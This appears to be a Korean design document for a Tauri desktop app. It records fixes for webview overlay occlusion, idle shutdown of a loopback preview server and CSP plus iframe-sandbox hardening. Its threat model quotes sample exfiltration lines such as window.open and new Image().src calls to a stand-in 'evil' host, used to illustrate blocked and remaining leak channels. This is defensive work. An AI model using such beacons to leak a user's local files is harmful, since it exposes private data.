# 브라우저·로컬 프리뷰 보강 설계 — 잔여 결함 3건

> 상태: **구현 완료(Implemented)** · 2026-07-26 · `/sc:design` → `/sc:implement` · 대상: gitpervisor (Tauri 2 + React 19)
>
> 3영역 모두 설계대로 구현했다(A → C → B 순). §5 오픈 이슈는 권고안대로 확정:
> ①관대 CSP + `connect-src` 차단 · ②엄격 모드 토글 보류 · ③유휴 10분 · ④토스트 현행 유지.
> 검증: `cargo test preview` 7건 통과, `cargo check --all-targets` 경고 없음, `tsc`·`vite build` 통과.
>
> 배경: `.html 브라우저로 열기`(로컬 프리뷰)와 `모아보기 브라우저 타일` 구현 후 2라운드 적대적
> 리뷰로 결함 25건을 수정했다. 이 문서는 그때 **고치지 않고 남긴 3건**의 수정 설계다.
> 이미 적용된 수정(폴더별 토큰, Referer 기반 서브리소스 인증, `resolve_request_path` 경로 봉쇄, Range 206,
> 커넥션 상한, `lastUrl` 리로드 방지, 셀 평탄화, 프리뷰 재발급)은 **전제**이며 재설계 대상이 아니다.

---

## 0. 범위와 결정 요약

| # | 결함 | 권고 | 규모 | 위험 | 구현 |
|---|---|---|---|---|---|
| A | 네이티브 webview 점유(occlusion) 정책이 불완전·산재 | 점유 게이트 중앙화(등록형 레지스트리 + 단일 셀렉터), 규범 문서 §4B 개정 | medium | low | ✅ `stores/occlusion.ts` 신규 + 9곳 배선 |
| B | 프리뷰 루프백 서버가 영구 생존 | 폴링 accept 루프 + `alive` 플래그 + 유휴 종료 + 프로젝트 제거 시 폐기 | medium | medium | ✅ `ServerEntry`·`revoke_under` |
| C | 프리뷰 iframe에 유출 채널이 열려 있음 | CSP 헤더(`connect-src 'self'` 등) + sandbox 축소, 엄격 모드는 설정으로 | small | low | ✅ `csp_header()` + sandbox 2속성 |

**핵심 판단 3가지 (아래 각 절에서 근거 제시)**

1. **[A] 토스트가 webview에 가리는 것은 버그가 아니다.** 기존 규범(`browser-feature-design.md:101`)이
   근거와 함께 의도적으로 제외한 트레이드오프다 → 유지한다. 진짜 문제는 그 규범이 **손으로 관리하는
   목록**이라 이미 낡았다는 구조다.
2. **[C] 위협은 처음 보이는 것보다 좁다.** 폴더별 토큰 + dotfile 차단이 이미 적용돼, 유출 가능 범위는
   "그 폴더 하위의 비-dotfile 파일"뿐이다. 따라서 정상 프리뷰(CDN)를 깨는 엄격 CSP는 기본값으로
   과하다 → 값싼 채널만 막고 엄격 모드는 옵트인.
3. **[B] 참조 카운팅보다 유휴 종료가 맞다.** 탭 수명은 프론트 localStorage에 있어 백엔드가 모른다.
   유휴 타임아웃은 "탭 닫힘"과 "사용자가 떠남"을 **한 메커니즘으로** 덮는다.

---

## 1. [A] 네이티브 webview 점유 정책

### 1.1 확인된 사실 (전수 조사, 파일:라인)

점유 판정 지점은 한 곳이다 — `BrowserPane.tsx:105-111`:

```
shouldShow = active && mode==="native" && !!url && !settingsOpen && !memoOpen && !confirm && !dbDialog
```

네이티브 webview 마운트 지점은 3곳(전부 메인 창): `WorkspaceTabs.tsx:165`(독립 탭),
`PaneTree.tsx:109`(분할 pane), `AggregateTerminals.tsx:660`(모아보기 셀).

**미커버 + 실제 겹침 확인 (= 진짜 결함)**

| 오버레이 | 선언·렌더 | 도달 경로 |
|---|---|---|
| `prompt` | ui.ts:107 · PromptDialog.tsx:41 `fixed inset-0 z-[60]` | 브라우저 탭 활성 중 파일트리 우클릭→새 파일/폴더 (FileTreePanel.tsx:525,540) |
| `quickOpenOpen` | ui.ts:92 · QuickPick.tsx:136 `z-[60]` | `mod+P` (KeyboardShortcuts.tsx:59) |
| `symbolSearchOpen` | ui.ts:94 · QuickPick.tsx:136 | `mod+Alt+N` (KeyboardShortcuts.tsx:66) |
| `imageEditorPath` | ui.ts:104 · ImageEditor.tsx:377 `z-50` | 파일트리 메뉴 (FileTreePanel.tsx:875) |
| 로컬 state 메뉴 6곳 | FileTreePanel:813 · ChangesPanel:541 · ProjectList:424 · TerminalPane:149 · WorkspaceTabs:231 · BrowserPane 자체 3개(290/418/466) | 우클릭·버튼 클릭 |

**겹치지 않아 결함이 아닌 것 (정직 구분)** — CommitList:147(LogPanel 내부, webview 뷰포트 밖),
InsertRowDialog(DbWorkspace:457)·EnvDialog:58(해당 탭 활성 시 브라우저는 `active=false`),
SearchPanel·LogPanel(in-flow 패널 → ResizeObserver가 처리), SysMonitor(별도 창).

**BrowserPane 자신의 드롭다운 3개**는 컨트롤 바(h-9)에 앵커돼 `top-full`로 **뷰포트 영역으로
펼쳐진다** — 북마크 메뉴는 최대 320px 침범(`max-h-80`, :466). 부수 사실: 닫기용 백드롭
`fixed inset-0 z-40`(:417,:465)은 **webview 사각형 안의 클릭을 받지 못한다**(네이티브 자식
webview가 OS 레벨에서 입력을 소비) → 바깥클릭 닫기도 webview 위에서는 무력이다.

### 1.2 핵심 제약 — 오버레이가 3계층에 산재

| 계층 | 예 | 단일 셀렉터로 잡히나 |
|---|---|---|
| 전역 `useUi` | settings, memo, confirm, prompt, quickOpen, symbolSearch, imageEditor | ✅ |
| 타 스토어 | `useDb.dialog` | ✅ (명시 구독 시) |
| **컴포넌트 로컬 state** | 컨텍스트 메뉴 6곳 | ❌ **불가** |

→ **"스토어 셀렉터 하나로 통일" 안은 성립하지 않는다.** 로컬 state 메뉴를 잡으려면 등록(register)
경로가 반드시 필요하다. 이것이 [A] 설계를 규정하는 제약이다.

재사용할 기존 관용: `AggregateTerminals.tsx:195-197`의 "열림 카운터 + `onMenuChange` 콜백",
`lib/browser.ts:125-137`의 전역 단조 세대 카운터.

### 1.3 설계 — 점유 게이트 중앙화

**신규 `src/stores/occlusion.ts` (작게 유지)**

```
count: number
acquire(): () => void      // 해제 함수를 돌려준다(단조 토큰, 이중 해제 무해)
```

**신규 훅 `useOccludesWebview(active: boolean)`** — `active`인 동안 acquire, false/언마운트 시 release.
로컬 state 메뉴를 가진 컴포넌트는 **한 줄만** 추가한다:

```
useOccludesWebview(!!menu);   // 이 메뉴가 열려 있으면 네이티브 webview를 숨긴다
```

적용 지점 9곳: FileTreePanel:813 · ChangesPanel:541 · ProjectList:424 · TerminalPane:149 ·
WorkspaceTabs:231 · AggregateTerminals의 NewItemButton(기존 카운터를 이 훅으로 대체) ·
BrowserPane 자체 3개(옴니박스 자동완성·DevPorts·북마크).

**전역 모달은 ui.ts에 콜로케이트된 셀렉터로**

```
// src/stores/ui.ts — 상태 선언 바로 아래에 둔다(추가하는 개발자 눈에 보이게)
export const selectBlockingOverlay = (s: UiState) =>
  s.settingsOpen || s.memoOpen || !!s.confirm || !!s.prompt ||
  s.quickOpenOpen || s.symbolSearchOpen || !!s.imageEditorPath;
// 계약: 전체 화면을 덮는 모달을 추가하면 여기에도 넣는다. 토스트는 넣지 않는다(규범 §4B).
```

**BrowserPane은 boolean 하나만 소비**

```
const blocked = useWebviewBlocked();   // selectBlockingOverlay || useDb.dialog || occlusion.count>0
const shouldShow = active && mode === "native" && !!url && !blocked;
```

`AggregateTerminals`의 `suspended`는 `resizing`만 남기고 `openMenus`는 레지스트리로 이관한다
(모아보기에서 webview가 N개일 때 "전부 숨김"이 자동으로 성립한다 — 각 BrowserPane이 같은
전역 게이트를 보므로).

### 1.4 규범 문서 개정 (필수)

`browser-feature-design.md` §4(B)3의 하드코딩 목록을 **셀렉터 참조로 교체**한다. 그 목록이
낡은 것이 이번 결함의 근본 원인이므로, 문서를 안 고치면 재발한다.

토스트 제외 규정(:101)은 **근거와 함께 유지**하고, "우하단 토스트가 webview에 부분적으로
가릴 수 있음"을 알려진 한계로 명시한다.

### 1.5 검증

- 수동: 브라우저 탭 활성 상태에서 `mod+P` / 파일트리 우클릭→새 폴더 / 이미지 편집기 열기 →
  모달이 webview 위에 보이는지. 모아보기에서 셀 2개 이상 띄우고 좌측 파일트리 우클릭 → 모든
  셀 webview가 숨는지.
- 회귀: 배경 fetch 에러 토스트가 뜰 때 webview가 **깜빡이지 않아야** 한다(토스트 제외 규정).
- e2e: `tests/e2e/suites/14-frontend-dom.mjs`의 그리드 표식은 이번 변경과 무관(유지).

---

## 2. [B] 프리뷰 루프백 서버 수명 관리

### 2.1 현 상태

`PreviewServers.ports: HashMap<PathBuf, (u16, String)>`(preview.rs:68)는 **삽입만** 하고 제거·종료
경로가 없다. `start_server`(:117)의 accept 루프는 `for stream in listener.incoming()`으로 블로킹
데몬 스레드라 프로세스 종료까지 산다. 레포 컨테인먼트 검증은 `preview_local_url` mint 시점뿐이다.

→ 프로젝트를 앱에서 제거해도, 프리뷰 탭을 전부 닫아도 그 폴더는 계속 서빙된다.

### 2.2 설계 — 폴링 accept + `alive` 플래그 + 유휴 종료

**왜 폴링인가**: 블로킹 `accept()`를 깨우는 표준 기법은 (a) self-connect, (b) `set_nonblocking` +
폴링 두 가지다. self-connect는 종료 경로에서 또 다른 커넥션을 만들어야 하고 실패 시 스레드가
영구히 남는다. `set_nonblocking(true)` + 250ms 폴링은 std만으로 되고, 유휴 상태 비용이 무시할
수준이며(초당 4회 `WouldBlock`), **폐기와 유휴 종료를 같은 루프에서** 처리할 수 있다.

**레지스트리 엔트리 확장**

```
struct ServerEntry {
    port: u16,
    token: String,
    alive: Arc<AtomicBool>,     // false로 내리면 폴링 루프가 다음 tick에 종료
    last_hit: Arc<AtomicU64>,   // 마지막 요청 시각(단조 초) — 유휴 판정
}
ports: HashMap<PathBuf, ServerEntry>
```

**세 가지 종료 트리거**

1. **유휴 종료** — 폴링 루프가 `now - last_hit > IDLE_SECS`면 `alive=false` 후 `break`.
   리스너가 drop되며 포트가 해제된다. 탭을 닫았든 사용자가 떠났든 한 메커니즘으로 덮는다.
2. **프로젝트 제거** — `remove_project`(projects.rs:272)에서 `state.preview.ports`를 훑어
   `base`가 제거된 프로젝트 경로 하위인 엔트리를 `alive=false` 처리. 프론트에 이미 같은 관용이
   있다(`queries/index.ts:694`가 제거 시 `closeProjectTerminals` 호출).
3. **자기 치유 mint** — `preview_local_url`이 기존 엔트리를 찾았을 때 `!alive`면 **없는 것으로
   간주하고 새 서버를 띄운다**. 죽은 스레드가 남긴 스테일 엔트리가 자동 정리되므로, 스레드가
   레지스트리를 직접 건드릴 필요가 없다(→ 스레드에 `AppState` 핸들을 넘기지 않아도 된다).

`handle_conn`은 진입 시 `last_hit`을 현재 시각으로 갱신하고, `!alive`면 즉시 503.

> ⚠️ **구현 함정**: `set_nonblocking(true)`로 두면 `accept()`가 `ErrorKind::WouldBlock`을 즉시
> 반복 반환하므로 그 분기에서 **반드시 sleep**해야 한다(안 그러면 CPU를 태우는 바쁜 루프).
> 그리고 플랫폼에 따라 **accept된 스트림이 논블로킹 속성을 상속**한다 — `handle_conn`은
> 타임아웃 있는 블로킹 I/O를 전제하므로, 넘기기 전에 `stream.set_nonblocking(false)`를
> 명시적으로 호출해야 한다. 빠뜨리면 요청 파싱이 `WouldBlock`으로 즉시 실패한다.

**의도적으로 채택하지 않은 것**: 요청마다 `state.projects`를 다시 조회하는 컨테인먼트 재검증.
폐기 트리거 2가 같은 위협("제거된 프로젝트가 계속 서빙")을 덮으면서 스레드에 `AppState`
접근을 요구하지 않는다. 재검증은 순수 추가 복잡도다(YAGNI).

### 2.3 검증

- 유닛: `IDLE_SECS` 경과 판정 헬퍼, `alive=false` 엔트리를 mint가 무시하고 재생성하는지.
- 수동: 프리뷰를 연 뒤 프로젝트 제거 → 그 포트로 curl 시 503/거부. 유휴 시간 경과 후 포트
  닫힘(`lsof -i :PORT` 무응답), 재프리뷰 시 **새 포트**로 정상 동작.

---

## 3. [C] 프리뷰 샌드박스 — 유출 채널 차단

### 3.1 위협 모델 (먼저 명시)

- **T1 자기 레포 프리뷰(대다수)**: 위협 없음. CDN 스크립트·폰트·외부 이미지를 흔히 쓴다 →
  **깨뜨리면 안 되는 정상 사용**이다.
- **T2 낯선 레포(클론/에이전트 산출물) 프리뷰**: HTML이 자기 토큰과 same-origin 권한으로 서빙
  루트의 형제 파일을 읽어 원격 전송할 수 있다.

**현재 blast radius (이미 좁혀짐)**: 폴더별 토큰 → 다른 폴더 서버에 인증 불가.
dotfile 차단 → `.git`/`.env`/`.ssh` 읽기 불가. 남은 노출 = **그 폴더 하위의 비-dotfile 파일**.
공격자가 그 HTML을 심었다면 형제 파일 내용은 이미 알고 있을 가능성이 높아, 실질 가치는
"사용자가 그 폴더에 나중에 넣은 파일"로 더 좁아진다. → **심각도는 중간 이하**이며, 이 판단이
"기본값을 엄격하게 하지 않는다"는 결론의 근거다.

### 3.2 설계 — 값싼 채널부터 막고, 엄격 모드는 옵트인

**(1) CSP 응답 헤더** — `handle_conn`의 HTML/XHTML 응답에 추가:

```
Content-Security-Policy:
  connect-src 'self'; form-action 'none'; object-src 'none'; base-uri 'self'
```

- `connect-src 'self'` → `fetch`/XHR/WebSocket/`sendBeacon` 원격 전송 차단 (**주 유출 경로**)
- `form-action 'none'` → 폼 POST 유출 차단
- `object-src 'none'`, `base-uri 'self'` → 플러그인·base 태그 우회 차단
- `default-src`는 **지정하지 않는다** → CDN 스크립트/스타일/폰트/이미지는 그대로 동작(T1 보호)

> ⚠️ **`frame-ancestors`를 넣지 말 것.** 프리뷰는 앱 origin(`tauri://localhost` / Windows는
> `http://tauri.localhost`)의 문서가 `127.0.0.1:PORT`를 `<iframe>`으로 감싸는 **교차 출처** 구조다.
> `frame-ancestors 'self'`를 붙이면 프레이밍 주체가 다른 출처라 **iframe 자체가 차단돼 기능이
> 통째로 죽는다.** 앱 origin은 플랫폼마다 달라 화이트리스트도 취약하므로 이 지시어는 생략한다
> (클릭재킹은 루프백+토큰 서버라 실질 위협이 아니다).

**(2) iframe sandbox 축소** — `BrowserPane.tsx:359`:

```
현재: allow-same-origin allow-scripts allow-forms allow-popups allow-modals
권고: allow-same-origin allow-scripts
```

- `allow-popups` 제거 → `window.open('https://evil/?d=…')` 유출 채널 차단. 프리뷰 페이지가
  팝업을 여는 정상 시나리오는 드물다.
- `allow-modals` 제거 → 프리뷰의 `alert()`가 **앱 webview를 블로킹하는 사고**를 예방하는 부수 이득.
- `allow-forms` 제거 → `form-action 'none'`과 중복이나 명시적으로 좁힌다.
- `allow-same-origin`은 **유지**한다. 제거하면 문서가 opaque origin이 돼 `fetch('./data.json')`이
  CORS로 막힌다 — 차트 페이지가 로컬 JSON을 읽는 흔한 정상 프리뷰가 깨진다.

**(3) 남는 한계 (문서화 필수)**: `img-src`/`script-src`를 열어 둔 이상
`new Image().src='https://evil/?d='+data` 형태의 유출은 여전히 가능하다. 이를 막으려면
`default-src 'self'`가 필요하고 그러면 CDN 프리뷰가 깨진다 → **설정 토글로 제공**(3.3).

### 3.3 엄격 모드(옵트인)

설정에 `프리뷰 격리 강화` 스위치(기본 off)를 두고, on이면 서버가
`default-src 'self'; connect-src 'self'; form-action 'none'`을 내보낸다. 낯선 레포를 다루는
사용자를 위한 탈출구다. 외부 리소스가 차단됐음을 사용자가 알아야 하므로, 켜져 있을 때는
프리뷰 탭 컨트롤 바에 작은 배지("격리됨")를 노출한다.

### 3.4 검증

- 유닛: 확장자별 CSP 헤더 부착 여부(HTML/XHTML에만), 엄격 모드 문자열 분기.
- 수동: CDN(`<script src=cdn>`)을 쓰는 샘플 HTML이 기본 모드에서 정상 렌더되고,
  `fetch('https://example.com')`은 콘솔에 CSP 위반으로 차단되는지. 엄격 모드에서 CDN 차단 확인.

---

## 4. 구현 순서

1. **[A] 점유 게이트** — 프론트 전용, 프로토콜 위험 없음, 사용자 체감이 가장 크다(모달이 안 보이는
   버그). 규범 문서 §4B 개정을 **같은 커밋에** 포함한다.
2. **[C] CSP + sandbox** — 헤더 한 줄 + 속성 축소. 작고 독립적. (엄격 모드 토글은 5-① 결정 후)
3. **[B] 서버 수명** — accept 루프를 건드리므로 가장 신중해야 한다. 앞 둘이 안정된 뒤 착수한다.

---

## 5. 오픈 이슈 — 사용자 결정 필요

| # | 질문 | 선택지 | 권고 | 확정 |
|---|---|---|---|---|
| ① | [C] 기본 격리 수준 | (a) 관대 + `connect-src` 차단 (b) 기본부터 엄격(`default-src 'self'`) | **(a)** — T1이 대다수, CDN 프리뷰를 깨면 기능 가치가 떨어진다 | ✅ (a) |
| ② | [C] 엄격 모드 토글을 이번에 만들까 | (a) 지금 (b) 요청 있을 때 | **(b)** — YAGNI. 3.2까지만 먼저 넣고 한계를 문서화 | ✅ (b) 보류 |
| ③ | [B] 유휴 종료 시간 | 5분 / **10분** / 30분 | **10분** — 프리뷰를 열어 두고 코드를 고치는 왕복을 견디는 최소치 | ✅ `IDLE_SECS=600` |
| ④ | [A] 토스트 | (a) 현행 유지(가려짐 허용) (b) 토스트도 webview 숨김 | **(a)** — 기존 규범의 근거(스크롤 중 깜빡임)가 여전히 유효 | ✅ (a) 제외 유지 |

②를 보류했으므로 §3.2의 잔여 한계(`<img src="https://evil/?d=…">` 류 유출)는 **현재 열려 있다.**
낯선 레포를 프리뷰하는 사용자가 생기면 §3.3을 구현한다.

---

## 5.5 구현 중 발견해 고친 결함 3건 (설계가 놓친 것)

설계대로 구현한 뒤 자체 검증에서 나온 것들이다. 설계 문서의 공백이었으므로 함께 기록한다.

1. **옴니박스 등록 신호 오선택 → webview 깜빡임** (`BrowserPane.tsx`)
   `useOccludesWebview(matches.length > 0)`로 등록했더니, 타이핑 중 매치 수가 0을 넘나들며
   (`"git"`→매치, `"gitzz"`→없음) webview가 show/hide를 반복했다. `focused`만 쓰면 포커스 시
   `draft`가 현재 url로 채워지므로 **주소창 클릭만으로 페이지가 비는** 더 나쁜 동작이 된다.
   → 드롭다운의 실제 전제조건인 `editingOmnibox = focused && q && q !== url`(안정적·단조)로 교체.

2. **mint→유휴종료 경합** (`preview.rs`)
   유휴 임계(599초)에 걸친 서버를 재사용해 URL을 내준 직후 폴링 tick이 그것을 죽이면, 프론트는
   살아있다고 믿는 포트가 닫혀 연결 거부가 된다. → **재사용을 활동으로 센다**(mint가 `last_hit`
   갱신). 이를 위해 `ServerEntry`에 `last_hit`·`started`를 (되)추가했다.

3. **탭은 열려 있는데 서버가 유휴로 죽음** (`stores/browser.ts` + `BrowserPane.tsx`)
   §2 설계가 "유휴 종료가 탭 닫힘을 덮는다"고 봤지만, **탭을 열어 둔 채 10분 방치한 뒤 페이지
   안 링크를 누르는** 경로를 놓쳤다(연결 거부). → `remintPreview(id)`를 분리해 **탭 활성화 시**
   호출한다. 서버가 살아 있으면 같은 URL이 돌아와 iframe 재로드가 없고(멱등), 죽었으면 새 포트로
   되살린다. 프로젝트 제거 후 재추가 등 다른 사망 원인도 같은 경로로 덮인다.

---

## 6. 미검증 영역 — 정직 고지

- **독립적(제3자) 회귀 재검토가 끝내 완료되지 않았다.** 라운드2 담당 에이전트는 사용량 한도로,
  이번 구현 검증 에이전트 2개는 API 과부하(529)로 실패했다. 그래서 §5.5의 3건은 **자체 검증**으로
  찾은 것이며, 같은 눈이 놓친 결함이 남아 있을 수 있다. 특히 아래는 **수동 실기 확인이 필요**하다:
  - [A] 9곳 배선의 실제 동작(모달·메뉴가 webview 위에 보이는지, 카운터 고착이 없는지)
  - [B] 유휴 10분 경과 후 탭 복귀 시 재발급이 실제로 되살리는지
  - [C] CDN을 쓰는 샘플 HTML이 정상 렌더되고 `fetch('https://…')`만 차단되는지
- 설계·구현 중 직접 확인한 범위는 다음과 같다:
  - ~~**302 무한 루프 없음**~~ — **이 경로는 이후 제거됐다.** 실기 테스트에서 서브리소스가 전부 403이 되는
    버그가 드러나(WebKit이 cross-site iframe에서 Referer를 origin만 남기고 깎는다) 인증을 "Referer 쿼리의
    토큰"에서 "Referer의 **출처** 일치"로 바꿨고, 토큰을 덧붙이던 302도 함께 없앴다.
    전말은 `TROUBLESHOOTING.md` §8 참조.
  - **Location 헤더 인젝션 없음** — 요청 라인은 공백 분리라 `path_part`에 raw CR/LF가 들어올 수
    없고, `%0D%0A`는 디코드하지 않은 채 echo되므로 헤더가 쪼개지지 않는다.
- Windows(WebView2)에서의 CSP·sandbox 동작과 `resolve_request_path`의 경로 특수성은 **실기
  확인이 필요**하다(이 레포의 1차 타깃 플랫폼이 Windows다).
